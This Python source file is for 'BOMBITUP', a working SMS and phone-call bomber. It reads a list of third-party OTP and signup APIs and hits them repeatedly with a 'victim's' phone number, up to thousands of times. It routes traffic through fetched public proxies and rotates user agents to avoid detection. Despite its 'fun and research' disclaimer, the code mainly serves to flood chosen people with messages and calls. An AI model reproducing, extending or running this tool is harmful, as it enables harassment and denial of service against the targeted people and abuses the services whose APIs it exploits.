#----------------------- Importing all required modules
from time import time, sleep
#from datetime import datetime as dt
import os
from requests import get, post, request as reqt
from random import choice
import subprocess
from colored import fore as Fore, style as Style
import argparse
import sys
#from concurrent.futures import ThreadPoolExecutor, as_completed
import shutil
import json
#import string, re
import threading

#---------------------------------------------



class IconicDecorator(object):
    def __init__(self):
        self.PASS = Style.BLINK + Fore.GREEN + "[ ✔ ]" + Style.RESET
        self.FAIL = Style.BLINK + Fore.RED + "[ ✘ ]" + Style.RESET
        self.WARN = Style.BLINK + Fore.YELLOW + "[ ! ]" + Style.RESET
        self.HEAD = Style.BLINK + Fore.CYAN + "[ # ]" + Style.RESET
        self.CMDL = Style.BLINK + Fore.BLUE + "[ → ]" + Style.RESET
        self.STDS = "     "

class StatusDecorator(object):
    def __init__(self):
        self.PASS = Style.BLINK + Fore.GREEN + "[ SUCCESS ]" + Style.RESET
        self.FAIL = Style.BLINK + Fore.RED + "[ FAILURE ]" + Style.RESET
        self.WARN = Style.BLINK + Fore.YELLOW + "[ WARNING ]" + Style.RESET
        self.HEAD = Style.BLINK + Fore.CYAN + "[ SECTION ]" + Style.RESET
        self.CMDL = Style.BLINK + Fore.BLUE + "[ COMMAND ]" + Style.RESET
        self.STDS = "           "

class MessageDecorator(object):
    def __init__(self, attr):
        ICON = IconicDecorator()
        STAT = StatusDecorator()
        if attr == "icon":
            self.PASS = ICON.PASS
            self.FAIL = ICON.FAIL
            self.WARN = ICON.WARN
            self.HEAD = ICON.HEAD
            self.CMDL = ICON.CMDL
            self.STDS = ICON.STDS
        elif attr == "stat":
            self.PASS = STAT.PASS
            self.FAIL = STAT.FAIL
            self.WARN = STAT.WARN
            self.HEAD = STAT.HEAD
            self.CMDL = STAT.CMDL
            self.STDS = STAT.STDS

    def SuccessMessage(self, RequestMessage):
        print(self.PASS + " "  + Fore.GREEN + RequestMessage + Style.RESET)

    def FailureMessage(self, RequestMessage):
        print(self.FAIL + " "  + Fore.RED + RequestMessage + Style.RESET)

    def WarningMessage(self, RequestMessage):
        print(self.WARN + " "  + Fore.YELLOW + RequestMessage + Style.RESET)

    def SectionMessage(self, RequestMessage):
        print(self.HEAD + " " + Fore.CYAN + Style.BLINK + RequestMessage + Style.RESET)

    def CommandMessage(self, RequestMessage):
        return self.CMDL + " " + Style.RESET + Fore.BLUE + RequestMessage + Fore.GREEN

    def GeneralMessage(self, RequestMessage):
        print(self.STDS + " "  + RequestMessage + Style.RESET)

def get_proxy():
    print('Fetching proxies from server...')
#    proxies = {'http':'http://157.230.247.57:3128','https':'https://157.230.247.57:3128'}
    curl = get('http://pubproxy.com/api/proxy?format=txt&type=http&country=TG,UA,VE,AD,AF,US,CA&not_country=IN,MX&port=3128&https=true&user-agent=true&cookies=true&referer=true&last_check=1').text.replace('\r','')
    if 'no proxy' in curl.lower():
        print('Can\'t fetch proxies')
        return None
    print(f'Using proxies: http://{curl} https://{curl}')
    return {"http":f'http://{curl}','https':f'https://{curl}'}

class APIProvider:

    api_providers=[]
    delay = 0
    status = True

    def __init__(self,cc,target,mode,proxies,delay=0):
        with open('apidata.json', 'r') as file:
            PROVIDERS = json.load(file)
        self.config = None
        self.cc = cc
        self.target = target
        self.mode = mode
        self.index = 0
        self.proxies = proxies
        self.lock = threading.Lock()
        self.ncc = readisdc(self.cc)
        APIProvider.delay = delay
        providers=PROVIDERS.get(mode.lower(),{})
        APIProvider.api_providers = providers.get(cc,[])
        APIProvider.api_providers+=providers.get("multi",[])

    def format(self):
        config_dump = json.dumps(self.config)
        config_dump = config_dump.replace("{target}",self.target).replace("{cc}",self.cc).replace("{ncc}",self.ncc)
        self.config = json.loads(config_dump)

    def select_api(self):
        self.config = choice(APIProvider.api_providers)
#        try:
#            self.index = choice(range(len(APIProvider.api_providers)))
#        self.index = 18
#        except IndexError:
#            self.index=-1
#            return
#        self.config = APIProvider.api_providers[self.index]
        
        with open('agents','rt') as file:
            readen = file.read()
            heads = readen.split('\n')
            
        perma_headers = choice(heads)
        
        if "headers" in self.config:
            config = self.config
            head = config.get('headers',{})
            head["user-agent"] = perma_headers
        else:
            self.config["headers"] = {}
            heads = self.config.get('headers',{})
            heads["user-agent"] = perma_headers
            
        self.format()

    def remove(self):
        try:
            del APIProvider.api_providers[self.index]
            return True
        except:
            return False

    def request(self):
        self.select_api()
        if not self.config or self.index==-1:
            return None
        identifier=self.config.pop("identifier","").lower()
        del self.config['name']
        self.config['timeout']=30
        self.config['proxies'] = self.proxies
        response=reqt(**self.config)
        response = int(str(response).replace('>','').replace('<Response','').replace(' ','').replace('[','').replace(']',''))
#         print(response)
#        sleep(1)
        if response in range(200,300):
            return True
        elif response not in range(200,300):
            return False
        return None

    def hit(self):
        try:
            if not APIProvider.status:
                return
            sleep(APIProvider.delay)
            self.lock.acquire()
            response = self.request()
            if response==False:
#                self.remove()
                pass
            elif response==None:
                APIProvider.status=False
            return response
        except:
            response=False
        finally:
            self.lock.release()
            return response

def returnNotMatches(a,b):
    return [[x for x in a if x not in b],[x for x in b if x not in a]]

def readisdc(cc):
    with open("isdcodes.json") as file:
        isdcodes = json.load(file)
        isdcodes = isdcodes.get('isdcodes',{})
        ncc = isdcodes[cc].lower()
    return ncc

def get_version():
    try:
        return open("version","r").read().strip()
    except:
        return '1.0'

def connected(host='https://www.google.co.in'): #Checking network connection.
    try:
        get(host, timeout=50)
        return True
    except:
        return False
    
def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
def bann_text():
    clr()
    logo = """

          )     *           (                  (     
   (   ( /(   (  `      (   )\ )  *   )        )\ )  
  ( )\  )\())  )\))(   ( )\ (()/(` )  /(    (  (()/(  
 )(((_)((_)\  ((_)()\  )((_) /(_))( )(_))   )\  /(_)) 
  ((_)_   ((_) (_()((_)((_)_ (_)) (_(_()) _ ((_)(_))   
  | _ ) / _ \ |  \/  | | _ )|_ _||_   _|| | | || _ \  
  | _ \| (_) || |\/| | | _ \ | |   | |  | |_| ||  _/  
  |___/ \___/ |_|  |_| |___/|___|  |_|   \___/ |_|   

"""
    
    version="Version: "+__VERSION__
    contributors="Contributors: "+" ".join(__CONTRIBUTORS__)
    print(choice(ALL_COLORS) + logo + RESET_ALL)
    mesgdcrt.SuccessMessage(version)
    mesgdcrt.SectionMessage(contributors)
    print()
    
def do_zip_update():
    success=False

    # Download Zip from git
    # Unzip and overwrite the current folder

    if success:
        mesgdcrt.SuccessMessage("BOMBITUP was updated to the latest version")
        mesgdcrt.GeneralMessage("Please run the script again to load the latest version")
    else:
        mesgdcrt.FailureMessage("Unable to update BOMBITUP.")
        mesgdcrt.WarningMessage("Grab The Latest one From https://github.com/Uni-Creator/BOMBITUP.git")

    sys.exit()

def do_git_update():
    success=False
    try:
        print(ALL_COLORS[0]+"UPDATING "+RESET_ALL,end='')
        process = subprocess.Popen("git checkout . && git pull ", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        while process:
            print(ALL_COLORS[0]+'.'+RESET_ALL,end='')
            sleep(1)
            returncode = process.poll()
            if returncode is not None:
                break
        success = not process.returncode
    except:
        success = False
    print("\n")

    if success:
        mesgdcrt.SuccessMessage("BOMBITUP was updated to the latest version")
        mesgdcrt.GeneralMessage("Please run the script again to load the latest version")
    else:
        mesgdcrt.FailureMessage("Unable to update BOMBITUP.")
        mesgdcrt.WarningMessage("Make Sure To Install 'git' ")
        mesgdcrt.GeneralMessage("Then run command:")
        print("git checkout . && git pull https://github.com/Uni-Creator/BOMBITUP.git HEAD")
    sys.exit()

def update():
    if shutil.which('git'):
        do_git_update()
    else:
        do_zip_update()
def check_for_updates():
    with open('sms_bobmer.py') as file:
        sms = file.read()
    with open('apidata.json') as file:
        apida = file.read()
    with open('isdcodes.json') as file:
        isdoc = file.read()
    with open('agents') as file:
        agen = file.read()
    mesgdcrt.SectionMessage("Checking for updates")
    bobmer = get('https://raw.githubusercontent.com/Uni-Creator/BOMBITUP/master/sms_bobmer.py').text.replace('\r','')
    version = get("https://raw.githubusercontent.com/Uni-Creator/BOMBITUP/master/version").text.strip().replace('\r','')
    isdcodes = get("https://raw.githubusercontent.com/Uni-Creator/BOMBITUP/master/isdcodes.json").text.replace('\r','')
    agents = get("https://raw.githubusercontent.com/Uni-Creator/BOMBITUP/master/agents").text.replace('\r','')
    apidata = get("https://raw.githubusercontent.com/Uni-Creator/BOMBITUP/master/apidata.json").text.replace('\r','')
    if version != __VERSION__:
        mesgdcrt.WarningMessage("An update is available")
        mesgdcrt.GeneralMessage("Starting update...")
        print(returnNotMatches(version,__VERSION__))
        update()
#    elif sms != bobmer:
#        mesgdcrt.WarningMessage("An update is available")
#        mesgdcrt.GeneralMessage("Starting update...")
#        print(returnNotMatches(sms,bobmer))
#        update()
    elif apida != apidata:
        mesgdcrt.WarningMessage("An update is available apidata.json is not up-to-date !")
        mesgdcrt.GeneralMessage("Starting update...")
        print(returnNotMatches(apida,apidata))
        update()
    elif isdoc != isdcodes:
        mesgdcrt.WarningMessage("An update is available isdcoeds.json is not up-to-date !")
        mesgdcrt.GeneralMessage("Starting update...")
        print(returnNotMatches(isdoc,isdcodes))
        update()
    elif agen != agents:
        mesgdcrt.WarningMessage("An update is available apidata.json is not up-to-date !")
        mesgdcrt.GeneralMessage("Starting update...")
        print(returnNotMatches(agen,agents))
        update()
    else:
        mesgdcrt.SuccessMessage("BOMBITUP is up-to-date")
        mesgdcrt.GeneralMessage("Starting BOMBITUP")
    sleep(2)
def check_intr():
    if connected():
        mesgdcrt.SuccessMessage('Connected to internet !')
        sleep(1)
        if sys.version_info[0]!=3:
            mesgdcrt.FailureMessage("BOMBITUP will work only in Python v3")
            sys.exit()

        try:
            country_codes = readisdc('91')
        except FileNotFoundError:
            update()
        check_for_updates()
    else:
        mesgdcrt.FailureMessage("Poor internet connection detected")
        exit()

def pretty_print(cc,target,success,failed,mode,delay):
    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
    mesgdcrt.GeneralMessage("Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage(f"Target       :   +{cc} {str(target)}")
    mesgdcrt.GeneralMessage(f"Sent         :   {str(failed + success)}")
    mesgdcrt.GeneralMessage(f"Success      :   {str(success)}")
    mesgdcrt.GeneralMessage(f"Failed       :   {str(failed)}")
    mesgdcrt.GeneralMessage(f"Delay        :   {delay} seconds")
    mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
    
def workernode(mode,cc,target,count,delay,proxies):
    
    api = APIProvider(cc,target,mode,proxies,delay)
    clr()
    max_threads = 100
    bann_text()
    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
    mesgdcrt.GeneralMessage("Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage(f"Target        :   +{cc} {str(target)}")
    mesgdcrt.GeneralMessage(f"Amount        :   {str(count)}")
    mesgdcrt.GeneralMessage(f"Delay         :   {delay} seconds")
    mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
    print()
    input(mesgdcrt.CommandMessage("Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))
    

    if len(APIProvider.api_providers)==0:
        mesgdcrt.FailureMessage("Your country/target is not supported as of now")
        mesgdcrt.GeneralMessage("Feel free to reach out to us")
        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
        bann_text()
        sys.exit()

    success,failed=0,0
    while success < count:
        result = api.hit()

        sleep(2)
        if result:
            success+=1
        elif not result:
            failed+=1
        clr()
        pretty_print(cc,target,success,failed,mode,delay)
        sleep(delay-3 if delay>0 else delay)
    print("\n")
    mesgdcrt.SuccessMessage("Bombing completed!")
    sleep(1)
    bann_text()
    
def selectnode(mode):    
    mode=mode.lower().strip()
    if mode == 'mail':
        mesgdcrt.WarningMessage('Coming soon!')
        exit()
    else:
        pass
    try:
        clr()
        bann_text()
        check_intr()
        while True:
            clr()
            bann_text()
            limit = 500
            cc = input(mesgdcrt.CommandMessage('Enter country code (without +): '))
            cc = cc.replace(' ','')
            if cc == '' or len(cc) not in range(2,4):
                mesgdcrt.FailureMessage('Invalid Country Code !')
                sleep(1)
            elif cc.isnumeric() and len(cc) in range(2,4):
                if cc == '91':
                    if mode == 'call':
                        limit = 200
                        mindelay = 5
                    else:
                        mindelay = 0
                        limit = 10000
                break
            else:
                mesgdcrt.FailureMessage('Invalid Country Code !')
                sleep(1)
        if cc != '91' and mode == 'call':
            mesgdcrt.WarningMessage('Oops! call mode is currently avialable only for +91')
            exit() 
        
        while True:
            clr()
            bann_text()
            victimNumber = input(mesgdcrt.CommandMessage(f"Enter victim's Number/s seperated by comma(,) +{cc}: "))
            victimNumber = victimNumber.replace(' ','')

            if victimNumber == '' or len(victimNumber) < 6:
                mesgdcrt.FailureMessage('Invalid number !')
                sleep(1)

            elif  not (',' in victimNumber) and (len(victimNumber) > 12):
                mesgdcrt.FailureMessage('Invalid number !')
                sleep(1)

            elif cc == '91' and len(victimNumber) != 10 and  not (',' in victimNumber):
                mesgdcrt.FailureMessage('Invalid number !')
                sleep(1)

            else:
                break

        victimsLis = []
        if len(victimNumber) in range(6,13) and victimNumber.isnumeric():
            victimsLis.append(victimNumber)
        else:
            testLis1 = victimNumber.split(',')
            print(testLis1)
            sleep(2)
            testLis2 = []

            for num in testLis1:            
                print(num)
                if len(num) in range(6,13) and num.isnumeric():
                    if cc == '91' and len(num) != 10:
                            mesgdcrt.FailureMessage('Invalid number is present in the list. Removing it..')
                            testLis2.append(num)
                            mesgdcrt.SuccessMessage('Number removed !\n')
                            sleep(2)

                elif not(len(num) in range(6,13)):
                    mesgdcrt.FailureMessage(f'Invalid number is present in the list. Removing it..')
                    testLis2.append(num)
                    mesgdcrt.SuccessMessage('Number removed !\n')
                    sleep(2)
                else:
                    mesgdcrt.FailureMessage(f'Invalid number is present in the list. Removing it..')
                    testLis2.append(num)
                    mesgdcrt.SuccessMessage('Number removed else !\n')
                    sleep(2)
            mesgdcrt.SuccessMessage('Removing Duplicates if any')
            testLis1 = list(set(testLis1))
            for a in testLis1:
                if not (a in testLis2):
                    victimsLis.append(a)
                    
            if len(victimsLis) < 1:
                mesgdcrt.FailureMessage('None of the number is valid please re-enter the numbers ')
                sleep(2)
                selectnode(mode)
            else:
                victimNumber = victimsLis

        
        while True:
            clr()
            bann_text()
            lis = []
            for Number in victimsLis:
                lis.append(f'+{cc} {Number}')
            mesgdcrt.SuccessMessage(f'Victims: {lis}')
            msgCount = input(mesgdcrt.CommandMessage(f'How many {mode}\'s do you want to send to the victim max {limit} : '))
            msgCount = msgCount.replace(' ','')
            
            if msgCount == '':
                mesgdcrt.FailureMessage('Invalid value')
                mesgdcrt.SuccessMessage(f'Automatically setting msg count to {limit - 1}')
                msgCount = limit - 1
                sleep(2)
                break
                
            elif msgCount.isnumeric():
                msgCount = int(msgCount)
                if msgCount < 1:
                    mesgdcrt.FailureMessage('Invalid value must be atleast 1')
                    mesgdcrt.SuccessMessage('Automatically setting msg count to min value (1)')
                    msgCount = 1
                    sleep(2)

                elif msgCount > limit:
                    mesgdcrt.FailureMessage(f'Invalid value max {limit}')
                    mesgdcrt.SuccessMessage(f'Automatically capping msg count to max value ({limit})')
                    msgCount = limit
                    sleep(2)

                break

            else:
                mesgdcrt.FailureMessage('Invalid value !')
                sleep(2)

        clr()
        bann_text()
        delay = input(mesgdcrt.CommandMessage(f'Enter the delay between {mode}\'s (min {mindelay} and max 20): '))
        dealy = delay.replace(' ','')
        if delay == '':
            mesgdcrt.FailureMessage('Invalid value')
            mesgdcrt.SuccessMessage(f'Automatically capping msg count to min value ({mindelay})')
            delay = mindelay
            sleep(2)
        elif delay.isdigit():
            delay = int(delay)
            if delay > 20:
                mesgdcrt.FailureMessage('Invalid value can\'t more than 20')
                mesgdcrt.SuccessMessage('Automatically capping msg count to min value (20)')
                delay = 20
                sleep(2)

            elif delay < mindelay:
                mesgdcrt.FailureMessage(f'Invalid value must be atleast {mindelay}')
                mesgdcrt.SuccessMessage(f'Automatically capping msg count to min value ({mindelay})')
                delay = mindelay
                sleep(2)
#                break

        prx = input(mesgdcrt.CommandMessage('Use proxy or not (y/n): '))
        prx=prx.replace(' ','')
        start = time()
        for target in victimsLis:
            try:
                if prx=='' or prx=='n':
                    proxies = None
                elif prx=='y':
                    proxies = get_proxy()
                else:
                    proxies = None
            except:
                proxies = None
            workernode(mode,cc,target,msgCount,delay,proxies)
        mesgdcrt.SuccessMessage(f'It\'s took {round(time()-start)} secs to bomb the {mode}\'s to victim')
        
    except KeyboardInterrupt :
        print('\n')
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()
        


mesgdcrt = MessageDecorator("icon")
__VERSION__ = get_version()
__CONTRIBUTORS__ = ['Uni-Creator']

ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
RESET_ALL = Style.RESET

description="""BOMBITUP - Your Friendly Spammer Application
BOMBITUP can be used for many purposes which incudes - 
\t Exposing the vulnerable APIs over Internet
\t Friendly Spamming
\t Testing Your Spam Detector and more ....
BOMBITUP is not intented for malicious uses.
"""

parser = argparse.ArgumentParser(description=description,epilog='Coded by Uni-Creator !!!')
parser.add_argument("-sms","--sms", action="store_true",help="start BOMBITUP with SMS Bomb mode")
parser.add_argument("-call","--call", action="store_true",help="start BOMBITUP with CALL Bomb mode")
parser.add_argument("-mail","--mail", action="store_true",help="start BOMBITUP with MAIL Bomb mode")
parser.add_argument("-u","--update", action="store_true",help="update BOMBITUP")
parser.add_argument("-c","--contributors", action="store_true",help="show current BOMBITUP contributors")
parser.add_argument("-v","--version", action="store_true",help="show current BOMBITUP version")


file = 'victims_numbers.txt'


if __name__ == "__main__":
    args = parser.parse_args()
    if args.version:
        print("Version: ",__VERSION__)
    elif args.contributors:
        print("Contributors: "," ".join(__CONTRIBUTORS__))
    elif args.update:
        update()
    elif args.mail:
        mode="mail"
        selectnode(mode)
    elif args.call:
        mode="call"
        selectnode(mode)
    elif args.sms:
        mode="sms"
        selectnode(mode)
    else:
        choic=""
        avail_choic={"1":"SMS","2":"CALL ","3":"MAIL","4":"EXIT"}
        try:
            while (not choic in avail_choic):
                clr()
                bann_text()
                print("Available Options:\n")
                for key,value in avail_choic.items():
                    print(f"[ {key} ] {value} BOMB")
                print()
                choic=input(mesgdcrt.CommandMessage("Enter Choice : "))
                if choic == "4":
                    clr()
                    bann_text()
                    sys.exit()
            mode=avail_choic[choic].lower()
            selectnode(mode)
        except KeyboardInterrupt : 
            print('\n')
            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
            sys.exit()
    sys.exit()
    
